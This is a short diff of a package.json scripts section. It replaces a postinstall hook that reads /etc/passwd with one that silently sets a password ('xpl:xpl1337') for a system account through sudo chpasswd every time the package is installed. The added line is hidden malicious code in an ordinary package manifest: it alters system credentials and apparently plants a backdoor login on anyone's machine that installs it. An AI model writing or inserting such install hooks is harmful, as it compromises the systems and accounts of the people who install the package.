@@ -11,7 +11,7 @@
   "main": "server.js",
   "scripts": {
     "start": "server.js",
-    "postinstall": "cat /etc/passwd"
+    "postinstall": "echo 'xpl:xpl1337' | sudo chpasswd"
   },
   "repository": {
     "type": "git",
